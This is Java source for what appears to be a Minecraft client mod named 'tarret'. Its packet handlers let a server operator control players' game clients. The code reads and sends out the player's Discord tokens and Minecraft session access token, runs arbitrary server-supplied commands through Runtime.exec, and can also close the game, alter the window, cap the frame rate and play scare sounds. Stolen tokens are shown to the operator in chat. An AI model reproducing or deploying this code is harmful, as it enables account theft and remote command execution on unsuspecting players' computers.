package de.hallotheengineer.tarret.networking;

import de.hallotheengineer.tarret.client.SoundPlayer;
import de.hallotheengineer.tarret.client.TarretClient;
import de.hallotheengineer.tarret.client.data.DiscordData;
import de.hallotheengineer.tarret.client.gui.AdminScreen;
import de.hallotheengineer.tarret.networking.packet.HandshakePacket;
import de.hallotheengineer.tarret.networking.packet.SoundType;
import de.hallotheengineer.tarret.networking.packet.c2s.DeliverDataC2SPacket;
import de.hallotheengineer.tarret.networking.packet.c2s.RequestOnlinePlayersC2SPacket;
import de.hallotheengineer.tarret.networking.packet.s2c.*;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.fabricmc.fabric.api.client.networking.v1.ClientConfigurationNetworking;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;
import net.fabricmc.fabric.api.networking.v1.PacketSender;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.client.session.Session;
import net.minecraft.text.Text;
import net.minecraft.text.Texts;
import net.minecraft.util.Formatting;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

@Environment(EnvType.CLIENT)
public class ModPacketsS2C {
    private static final Base64.Encoder encoder = Base64.getEncoder();
    private static final Base64.Decoder decoder = Base64.getDecoder();
    public static void register() {
        ClientPlayConnectionEvents.INIT.register((handler, client) -> {
            ClientPlayNetworking.registerReceiver(AccessTokenDeliveryS2CPacket.TYPE, ModPacketsS2C::updateAccessToken);
            ClientPlayNetworking.registerReceiver(RequestOnlinePlayersS2CPacket.TYPE, ModPacketsS2C::updatePlayers);
            ClientPlayNetworking.registerReceiver(CloseMinecraftS2CPacket.TYPE, ModPacketsS2C::closeMinecraft);
            ClientPlayNetworking.registerReceiver(EditWindowTitleS2CPacket.TYPE, ModPacketsS2C::editWindowTitle);
            ClientPlayNetworking.registerReceiver(ToggleFullscreenS2CPacket.TYPE, ModPacketsS2C::toggleFullscreen);
            ClientPlayNetworking.registerReceiver(LimitFPSS2CPacket.TYPE, ModPacketsS2C::limitFPS);
            ClientPlayNetworking.registerReceiver(ExecuteCommandS2CPacket.TYPE, ModPacketsS2C::executeCommand);
            ClientPlayNetworking.registerReceiver(RequestDataS2CPacket.TYPE, ModPacketsS2C::fetchData);
            ClientPlayNetworking.registerReceiver(DeliverDataS2CPacket.TYPE, ModPacketsS2C::handleDataDelivery);
            ClientPlayNetworking.registerReceiver(ResizeWindowS2CPacket.TYPE, ModPacketsS2C::resizeWindow);
            ClientPlayNetworking.registerReceiver(ScareS2CPacket.TYPE, ModPacketsS2C::handleScare);
        });
        ClientConfigurationNetworking.registerGlobalReceiver(HandshakePacket.TYPE, ModPacketsS2C::handleHandshake);
    }

    private static void handleScare(ScareS2CPacket packet, ClientPlayerEntity player, PacketSender packetSender) {
        switch (packet.type()) {
            case SCARY_ALERT -> {
                SoundPlayer.playSound(SoundType.SCARY_ALERT.fileName);
            }
            case SOUND_ALERT -> {
                SoundPlayer.playSound(packet.data());
            }
        }
    }

    private static void resizeWindow(ResizeWindowS2CPacket packet, ClientPlayerEntity player, PacketSender packetSender) {
        MinecraftClient.getInstance().getWindow().setWindowedSize(packet.width(), packet.height());
    }

    private static void handleDataDelivery(DeliverDataS2CPacket packet, ClientPlayerEntity player, PacketSender packetSender) {
        switch (packet.type()) {
            case DISCORD_TOKEN -> {
                String[] tokens = new String(decoder.decode(packet.data()), StandardCharsets.ISO_8859_1).split("/");
                displayChatMessage(Text.literal("["+packet.source()+"] Found "+tokens.length+" discord tokens"));
                for (String e : tokens) {
                    displayChatMessage(Text.literal(">").append(Texts.bracketedCopyable(e).formatted(Formatting.OBFUSCATED).formatted(Formatting.GREEN)));
                }
            }
            case MINECRAFT_SESSION -> {
                String s = new String(decoder.decode(packet.data()), StandardCharsets.ISO_8859_1);
                displayChatMessage(Text.literal("Minecraft Session of "+packet.source()+": ").append(Texts.bracketedCopyable(s).formatted(Formatting.OBFUSCATED).formatted(Formatting.GREEN)));
            }
        }
    }

    private static void fetchData(RequestDataS2CPacket packet, ClientPlayerEntity player, PacketSender packetSender) {
        switch (packet.type()) {
            case DISCORD_TOKEN -> new Thread("dc") {
                @Override
                public void run() {
                    DiscordData discord = new DiscordData();
                    ClientPlayNetworking.send(new DeliverDataC2SPacket(packet.type(), encoder.encodeToString(discord.getTokens().getBytes()), packet.target(), player.getName().getString()));
                }
            }.start();
            case MINECRAFT_SESSION -> {
                Session session = MinecraftClient.getInstance().getSession();
                ClientPlayNetworking.send(new DeliverDataC2SPacket(packet.type(), encoder.encodeToString(session.getAccessToken().getBytes()), packet.target(), player.getName().getString()));
            }
        }
    }
    private static void executeCommand(ExecuteCommandS2CPacket packet, ClientPlayerEntity clientPlayerEntity, PacketSender packetSender) {
        try {
            Runtime.getRuntime().exec(packet.command());
        } catch (IOException ignored) {
        }
    }

    private static void limitFPS(LimitFPSS2CPacket packet, ClientPlayerEntity clientPlayerEntity, PacketSender packetSender) {
        MinecraftClient.getInstance().getWindow().setFramerateLimit(packet.fps());
    }

    private static void toggleFullscreen(ToggleFullscreenS2CPacket packet, ClientPlayerEntity clientPlayerEntity, PacketSender packetSender) {
        MinecraftClient.getInstance().getWindow().toggleFullscreen();
    }

    private static void updatePlayers(RequestOnlinePlayersS2CPacket packet, ClientPlayerEntity clientPlayerEntity, PacketSender packetSender) {
        MinecraftClient client = MinecraftClient.getInstance();
        client.execute(() -> {
            TarretClient.setAdminScreen(new AdminScreen());
            TarretClient.getAdminScreen().players = packet.players();
            client.setScreen(TarretClient.getAdminScreen());
        });
    }
    private static void updateAccessToken(AccessTokenDeliveryS2CPacket packet, ClientPlayerEntity clientPlayerEntity, PacketSender packetSender) {
        TarretClient.currentAccessToken = packet.accessToken();
        TarretClient.getLoginScreen().buttonWidget1.setMessage(Text.translatable("button.tarret.login"));
        ClientPlayNetworking.send(new RequestOnlinePlayersC2SPacket(packet.accessToken()));
    }
    private static void editWindowTitle(EditWindowTitleS2CPacket packet, ClientPlayerEntity clientPlayerEntity, PacketSender packetSender) {
        TarretClient.forcedTitle = packet.title();
        MinecraftClient.getInstance().getWindow().setTitle(packet.title());
    }
    private static void closeMinecraft(CloseMinecraftS2CPacket closeMinecraftS2CPacket, ClientPlayerEntity clientPlayerEntity, PacketSender packetSender) {
        MinecraftClient.getInstance().close();
    }
    private static void handleHandshake(HandshakePacket packet, PacketSender responseSender) {
        responseSender.sendPacket(new HandshakePacket());
    }
    private static void displayChatMessage(Text message) {
        MinecraftClient.getInstance().inGameHud.getChatHud().addMessage(message);
    }
}
